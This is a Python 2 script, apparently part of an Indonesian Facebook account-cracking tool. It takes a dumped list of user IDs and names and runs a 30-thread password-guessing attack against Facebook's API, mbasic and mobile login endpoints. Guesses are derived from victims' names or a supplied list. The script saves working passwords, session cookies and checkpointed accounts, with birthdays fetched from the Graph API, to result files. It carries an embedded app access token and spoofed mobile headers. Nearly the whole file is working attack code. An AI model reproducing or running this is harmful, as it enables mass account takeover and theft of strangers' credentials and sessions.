    def __init__(self):
        self.id = []

    def plerr(self):
        try:
            self.apk = raw_input('\n [%s?%s] Masukan File : '%(O,N))
            self.id = open(self.apk).read().splitlines()
            print '\n [%s+%s] Total Id •> %s%s%s' %(O,N,M,len(self.id),N)
        except:
            print '\n %s[%s×%s] File [%s%s%s] Tidak Ada, Dump Id Dulu Bro Cek Nomor 1 Sampai 4'%(N,M,N,M,self.apk,N);time.sleep(3)
            raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
        ___raka_amanda___ = raw_input(' [%s?%s] Do You Want To Use Manual Password? [Y/t]: '%(O,N))
        if ___raka_amanda___ in ('Y', 'y'):
            print '\n %s[%s!%s] Gunakan , (Koma) Untuk Pemisah Contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
            while True:
                pwek = raw_input('\n [%s?%s] Masukan Kata Sandi : '%(O,N))
                print ' [*] Crack Dengan Sandi •> [ %s%s%s ]' % (M, pwek, N)
                if pwek == '':
                    print '\n %s[%s×%s] Jangan Kosong Bro Kata Sandi Nya'%(N,M,N)
                elif len(pwek)<=5:
                    print '\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N)
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = raw_input('\n [\x1b[1;96m◍➤\x1b[1;97m] Methode : ')
                        if cin == '':
                            print '\n %s[%s×%s] Jangan Kosong Bro'%(N,M,N);__yan__()()
                        elif cin == '1':
                            print '\n [%s+%s] Hasil Disimpan Ke •> result/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] Hasil Disimpan Ke •> result/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] Anda Bisa Mematikan Data Selular Untuk Menjeda Proses Crack\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[1]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif cin == '2':
                            print '\n [%s+%s] Hasil Disimpan Ke •> resul/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] Hasil Disimpan Ke •> resul/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] Anda Bisa Mematikan Data Selular Untuk Menjeda Proses Crack\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[1]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif cin == '3':
                            print '\n [%s+%s] Hasil Disimpan Ke •> result/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] Hasil Disimpan Ke •> result/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] If No Result Use Airplane Mode 1 Second\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[1]
                                        __yayanXD__.submit(self.__mfb,__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        else:
                            print '\n %s[%s×%s] Input Yang Bener'%(N,M,N);__yan__()
                    print '\n [ Pilih Method Login Silahkan Coba Satu² ]\n'
                    print ' [%s1%s]\x1b[1;96m◍➤\x1b[1;97m Method API [\x1b[1;92mFast\x1b[1;97m]'%(O,N)
                    print ' [%s2%s]\x1b[1;96m◍➤\x1b[1;97m Method Mbasic [\x1b[1;92mSlow\x1b[1;97m]'%(O,N)
                    print ' [%s3%s]\x1b[1;96m◍➤\x1b[1;97m Method Mobile [\x1b[1;92mSuper Slow\x1b[1;97m]'%(O,N)
                    __yan__(pwek.split(','))
                    break
        elif ___raka_amanda___ in ('T', 't'):
            print '\n [ Pilih Method Login Silahkan Coba Satu² ]\n'
            print ' [%s1%s]\x1b[1;96m◍➤\x1b[1;97m Method API [\x1b[1;92mFast\x1b[1;97m]'%(O,N)
            print ' [%s2%s]\x1b[1;96m◍➤\x1b[1;97m Method Mbasic [\x1b[1;92mNormal\x1b[1;97m]'%(O,N)
            print ' [%s3%s]\x1b[1;96m◍➤\x1b[1;97m Method Mobile [\x1b[1;92mSlow\x1b[1;97m]'%(O,N)
            self.__pler__()
        else:
            print '\n %s[%s×%s] Y/t Juancok!'%(N,M,N);self.plerr()
        return

    def __api__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r %s◍➤%s CRACK %s/%s •> [OK-:%s] - [CP-:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": _kontol, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if response.status_code != 200:
                sys.stdout.write('\r %s[%s!%s] If No Result Use Airplane Mode 1 Second'%(N,M,N)),
                sys.stdout.flush()
                loop +=1
                self.__api__()
            if 'access_token' in response.text and 'EAAA' in response.text:
                print '\r %s[ANGGA_OK] %s|%s                 %s' % (H,user,pw,N)
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r %s[ANGGA_CP] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r %s[ANGGA_CP] %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue

        loop += 1
    def __mbasic__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r %s◍➤%s CRACK %s/%s •> [OK-:%s] - [CP-:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s[ANGGA_OK] %s|%s|%s                 %s' % (H,user,pw,kuki,N)
                wrt = ' [✓] %s|%s|%s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r %s[ANGGA_CP] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r %s[ANGGA_CP] %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue

        loop += 1
    def __mfb__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r %s◍➤%s CRACK %s/%s •> [OK-:%s] - [CP-:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s[ANGGA_OK] %s|%s|%s                 %s' % (H,user,pw,kuki,N)
                wrt = ' [✓] %s|%s|%s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r %s[ANGGA_CP] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r %s[ANGGA_CP] %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1
    def __pler__(self):
        yan = raw_input('\n [\x1b[1;96m◍➤\x1b[1;97m] Methode : ')
        if yan == '':
            print '\n %s[%s×%s] Jangan Kosong Bos'%(N,M,N);self.__pler__()
        elif yan in ('1', '01'):
            print '\n [%s+%s] Hasil OK Disimpan Ke •> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] Hasil CP Disimpan Ke •> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] If No Result Use Airplane Mode 1 Second\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        name, uid = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __yayanXD__.submit(self.__api__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('2', '02'):
            print '\n [%s+%s] Hasil OK Disimpan Ke •> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] Hasil CP Disimpan Ke •> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] If No Result Use Airplane Mode 1 Second\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        name, uid = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __yayanXD__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('3', '03'):
            print '\n [%s+%s] Hasil Disimpan Ke •> result/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] Hasil Disimpan Ke •> result/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] If No Result Use Airplane Mode 1 Second\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        name, uid = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __yayanXD__.submit(self.__mfb__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)

        else:
            print '\n %s[%s×%s] Input Yang Bener'%(N,M,N);self.__pler__()

if __name__ == '__main__':
    os.system('git pull')
    raka_amanda()
